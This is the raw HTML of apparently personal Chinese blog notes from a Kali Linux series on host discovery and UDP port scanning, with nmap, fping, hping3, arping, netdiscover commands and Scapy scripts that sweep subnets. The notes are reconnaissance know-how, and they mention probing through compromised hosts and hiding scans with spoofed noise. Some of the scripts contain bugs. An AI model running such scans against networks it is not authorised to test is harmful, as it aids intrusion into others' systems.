class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">     a=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=1,verbose=0)</span><br><span class="line">     if a==None:</span><br><span class="line">       pass</span><br><span class="line">     else:</span><br><span class="line">       print prefix+str(addr)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>🔺命令：./pinger2.py iplist.txt</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./pinger2.py [iplist.txt]&quot;</span><br><span class="line">    print &quot;Example - ./pinger2.py iplist.txt&quot;</span><br><span class="line">    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">filename=str(sys.argv[1])</span><br><span class="line">file=open(filename,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line">for addr in file:</span><br><span class="line">    a=sr1(IP(dst=addr.strip())/ICMP(),timeout=0.1,verbose=0)</span><br><span class="line">    if a==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print addr.strip()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>发现-三层发现（nmap）</p>
<ul>
<li><strong><code>🔺命令：nmap IP地址-254 -sn</code></strong>（同网段是发ARP包，不同网段是发ICMP包）</li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -sn</code></strong></li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>namp -sn对于同网段是发ARP包和DNS包，不同网段是发ICMP包（请求字段为时间戳13和请求包8）、DNS包和TCP包 </code></pre></blockquote>
<ol start="4">
<li><p>发现-三层发现（fping）</p>
<ul>
<li><strong><code>🔺命令：fping IP地址 -c 1</code></strong></li>
<li><strong><code>🔺命令：fping -g 起始IP地址 最后IP地址（IP地址段）-c 1</code></strong></li>
<li><strong><code>🔺命令：fping -g IP网段/24</code></strong>  ▲2019.12.2过滤输出格式不对</li>
<li><strong><code>🔺命令：fping -f iplist.txt</code></strong></li>
</ul>
</li>
<li><p>发现-三层发现（Hping）</p>
<ul>
<li>Hping（几乎可以完成所以IP、TCP协议包头的组合，也可对于基于TCP服务器进行压力测试）<ul>
<li>能够发生几乎所有任意TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标</li>
</ul>
</li>
<li><strong><code>🔺命令：hping3 IP地址 --icmp -c 2</code></strong></li>
<li><strong><code>🔺命令：for addr in $(seq 1 254); do hping3 1.1.1.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done</code></strong></li>
<li><strong><code>🔺命令：cat handle.txt |  grep ^len</code></strong></li>
</ul>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linux笔记(十四)：主机发现--二层发现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>主动信息收集</p>
<ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹（可能被封杀，强的流量分析，强的代码审计）</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已被控制的主机</li>
<li>做好被封杀的准本</li>
<li>使用噪声迷惑目标，淹没真实的探测流量（伪造IP发送大量垃圾信息）</li>
</ul>
</li>
<li>扫描（IP层 → 端口层 → 服务级别的扫描）<ul>
<li>发送不同的探测，根据结果判断目标状态</li>
</ul>
</li>
</ul>
</li>
<li><p>发现（IP层 → 端口层 → 服务级别的扫描）</p>
<ul>
<li>识别活着的主机<ul>
<li>潜在的被攻击目标（存在的漏洞来进行利用）</li>
</ul>
</li>
<li>输出一个IP地址列表（在线IP地址）</li>
<li>2、3、4层发现</li>
</ul>
</li>
<li><p>发现-二层发现（arping）</p>
<ul>
<li>优点：扫描速度快、可靠</li>
<li>缺点：不可路由（只可发现本网段的主机发现）</li>
<li>Arp协议<ul>
<li>抓包</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>OSI模型
Layer1 Physical
Layer2 Data Link       ARP
Layer3 Network         IPv4,IPv6,ICMP,and IPSec
Layer4 Transport       TCP and UDP
Layer5 Session         NetBIOS,PPTP,RPC,and SOCKS
Layer6 Presentation    ASCII,JPEG,PDF,PNG,and DOCX
Layer7 Application     HTTP,FTP,and Telnet</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：arping</code></strong></li>
<li><strong><code>🔺命令：arping IP地址 -c 1</code></strong>（发送一个ARP包）</li>
<li><strong><code>🔺命令：arping IP地址 -d</code></strong>（发现重复IP地址拥有一个MAC地址，可以发现arp地址欺骗）</li>
<li><strong><code>🔺命令：arping -c 1 Ip地址 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></strong></li>
<li>脚本 ▲2019.12.2新版ifconfig命令显示不同，对相应脚本进行修改<ul>
<li><strong><code>🔺命令：./arping1.sh eth0 &gt;iplist.txt</code></strong>（检查网内”存活”的计算机）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [interface]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh eth0&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">interface=$1</span><br><span class="line">prefix=$(ifconfig $interface | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &apos;&#123;print $2&#125;&apos;)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ul>
<li>脚本 <ul>
<li><strong><code>🔺命令：./arping2.sh iplist.txt</code></strong>（重新检查”存活”的主机）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#！/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [iplist.txt]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh iplist.txt&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">fi</span><br><span class="line">file=$1</span><br><span class="line">for addr in $(cat $file); do</span><br><span class="line">    arping -c 1 $addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>发现-二层发现（Netdiscover）</p>
<ul>
<li>Netdiscover（支持CIDR地址段显示）▲2019.12.2可抓到包，但界面不显示<ul>
<li>专门用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
</ul>
</li>
<li>主动<ul>
<li><strong><code>🔺命令：netdiscover -i eth0 -r IP地址/24</code></strong></li>
<li><strong><code>🔺命令：netdiscover -l iplist.txt</code></strong></li>
</ul>
</li>
<li>被动（把网卡制成混杂模式进行监听）<ul>
<li><strong><code>🔺命令：netdiscover -p</code></strong></li>
<li>主动arp容易触发报警</li>
</ul>
</li>
</ul>
</li>
<li><p>发现-二层发现（Scapy）</p>
<ul>
<li>Scapy<ul>
<li>作为Python库进行调用</li>
<li>也可以作为单独的工具使用</li>
<li>抓包、分析、创建、修改、注入网络流量</li>
</ul>
</li>
<li>apt-get install python3-gnuplot（报错可安装）▲2019.12.2依然会报错，但不影响使用</li>
<li>Scapy<ul>
<li>arp=ARP（）</li>
<li>arp.pdst=”IP地址”（进行赋值）</li>
<li>answer=sr1(arp)（发生数据包）</li>
<li>answer.display() （显示数据包的结构，分层）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>ARP().dispaly()（定制一个ARP的数据包，只需要添加属性字段，ARP的包头结构）
sr1()（发送数据包）</code></pre></blockquote>
<ul>
<li>python脚本（用Scapy写的python脚本）<ul>
<li><strong><code>🔺命令：./Arp1.py 接口</code></strong> ▲2019.12.1 strip()函数报错</li>
<li><strong><code>🔺命令：./Arp2.py iplist.txt</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./Arp1.py [interface]&quot;</span><br><span class="line">    print &quot;Example - ./Arp1.py eth0&quot;</span><br><span class="line">    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">interface=str(sys.argv[1])</span><br><span class="line"></span><br><span class="line">ip=subprocess.check_output(&quot;ifconfig &quot;+interface+&quot; | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &apos;&#123;print $2&#125;&apos;&quot;,shell=True).strip()</span><br><span class="line">prefix=ip.split(&quot;.&quot;)[0]+&quot;.&quot;+ip.split(&quot;.&quot;)[1]+&quot;.&quot;+ip.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line">for addr in range(0,254):</span><br><span class="line">    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)</span><br><span class="line">    if answer==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print prefix+str(addr)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./Arp2.py [iplist.txt]&quot;</span><br><span class="line">    print &quot;Example - ./Arp2.py iplist.txt&quot;</span><br><span class="line">    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">filename=str(sys.argv[1])</span><br><span class="line">file=open(filename,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line">for addr in file:</span><br><span class="line">    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)</span><br><span class="line">    if answer==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print addr.strip()</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>发现-二层发现（nmap）</p>
<ul>
<li><strong><code>🔺命令：nmap IP地址-254（IP地址/24） -sn</code></strong> </li>
<li><strong><code>🔺命令：namp -iL（调用地址列表的文本文件） iplist.txt -sn | grep ^Namp</code></strong></li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>强大的NMAP软件，需要非常熟练
nmap的-sn参数，除了会ARP发现之外，还会进行DNS的反向域名解析</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--UDP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--UDP/" itemprop="url">Kali Linux笔记(十七)：端口扫描--UDP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>端口扫描（UDP）</p>
<ul>
<li>端口对应网络服务及应用端程序</li>
<li>服务端程序的漏洞通过端口攻入</li>
<li>发现开放的端口</li>
<li>更具体的攻击面</li>
<li>UDP端口<ul>
<li>假设ICMP port-unreachable 响应代表端口关闭（没有响应，即为端口开放）</li>
<li>目标系统不响应ICMP port-unreachable时，可能产生误判</li>
</ul>
</li>
<li>完整的UDP应用层请求<ul>
<li>准确性高</li>
<li>耗时巨大</li>
</ul>
</li>
</ul>
</li>
<li><p>端口扫描（Scapy-UDP）</p>
<ul>
<li>Scapy UDP Scan<ul>
<li>端口关闭：ICMP port-unreachable</li>
<li>端口开放：没有回包</li>
<li>了解每一种基于UDP的应用包结构很有帮助</li>
<li>与三层相同的技术</li>
<li>误判</li>
</ul>
</li>
<li>Scapy<ul>
<li>sr1(IP(dst=”IP地址”)/UDP(dport=53),timeout=1,verbose=1)</li>
</ul>
</li>
<li><strong><code>🔺命令：./udp_scan.py IP地址 起始端口 结束端口</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=4:</span><br><span class="line">    print &quot;Usage - ./udp_scan.py [Target IP] [First IP] [Last IP] &quot;</span><br><span class="line">    print &quot;Example - ./udp_scan.py 192.168.100.1 1 200&quot;</span><br><span class="line">    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">start=int(sys.argv[2])</span><br><span class="line">end=int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">for port in range(start end):</span><br><span class="line">    a=sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    if a==None:</span><br><span class="line">      print port</span><br><span class="line">    else:</span><br><span class="line">      pass</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>端口扫描（Nmap-UDP）</p>
<ul>
<li>Nmap</li>
<li><strong><code>🔺命令：nmap -sU（端口扫描） IP地址</code></strong><ul>
<li>默认的1000个参数（不指定端口的情况下）</li>
<li>ICMP host-unreachable</li>
</ul>
</li>
<li><strong><code>🔺命令：nmap IP地址 -sU -p（指定端口） 53</code></strong></li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -sU -p（指定端口范围） 1-200</code></strong></li>
</ul>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%85%AD)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linux笔记(十六)：主机发现--四层发现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>发现-四层发现（不对端口状态进行识别，主要是对IP是否在线进行识别）</p>
<ul>
<li>优点<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
</li>
<li>缺点<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
</li>
<li>TCP（正常过程：SYN–SYN/ACK–ACK）<ul>
<li>未经请求的ACK–RST</li>
<li>SYN–SYN/ACK、RST</li>
</ul>
</li>
<li>UDP<ul>
<li>ICMP端口不可达、一去不复返（被识别主机端口未开放UDP服务）</li>
</ul>
</li>
</ul>
</li>
<li><p>发现-四层发现（Scapy-TCP）</p>
<ul>
<li>ACK–TCP Port–RST</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>i.dst=”IP地址”</li>
<li>t=TCP()</li>
<li>t.flags=”A”</li>
<li>r=(i/f)</li>
<li>a=sr1(r)</li>
<li>a.display()</li>
</ul>
</li>
<li>a=sr1(IP(dst=”IP地址”)/TCP(dport=80,flags=”A”),timeout=1)</li>
<li><strong><code>🔺命令：./ACK_Ping.py IP网段</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./ACK_Ping.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./ACK_Ping.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform a TCP ACK scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">    response=sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flags=&apos;A&apos;),timeout=0.1,verbose=0)</span><br><span class="line">    try:</span><br><span class="line">      if int(response[TCP].flags)==4:</span><br><span class="line">        print prefix+str(addr)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>发现-四层发现（Scapy-UDP）</p>
<ul>
<li>UDP–UDP Port–ICMP</li>
<li>Scapy<ul>
<li>i=IP()</li>
<li>u=UDP()</li>
<li>i.dst=”IP地址”</li>
<li>u.dport=33333</li>
<li>r=(i/u)</li>
<li>a=sr1(r,timeout=1,verbose=1)</li>
<li>a.display()</li>
</ul>
</li>
<li><strong><code>🔺命令：./UDP_Ping.py IP网段</code></strong>（UDP发现不可靠）</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./UDP_Ping.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./UDP_Ping.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform a UDP ICMP scan of the 192.168.100.0/24 range&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">    response=sr1(IP(dst=prefix+str(addr))/UDP(dport=33333),timeout=0.1,verbose=0)</span><br><span class="line">    try:</span><br><span class="line">      if int(response[IP].proto)==1:</span><br><span class="line">        print prefix+str(addr)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>发现-四层发现（Nmap）</p>
<ul>
<li><strong><code>🔺命令：nmap IP地址-254 -PU53（对于UDP53端口）-sn</code></strong></li>
<li><strong><code>🔺命令：nmap IP地址-254 -PA80（对于TCP80端口）-sn</code></strong></li>
<li><strong><code>🔺命令：nmap -iL iplist.txt -PA80 -sn</code></strong></li>
</ul>
</li>
</ol>
<p>▲ 2019.12.3 Nmap局域网，无论是TCP还是UDP，发送的都是DNS的包，局域网内是发给网关<br>▲ 2019.12.3 Nmap外网，UDP查询时发送DNS包，TCP发送TCP包</p>
<blockquote>
<pre><code>nmap IP地址 -P0 -sn Ping层的发现
nmap IP地址 -PS -sn SCTP发现
nmap IP地址 -PE -sn ICMP echo
nmap IP地址 -PP -sn 时间戳
namp IP地址 -PM -sn 子网掩码发现
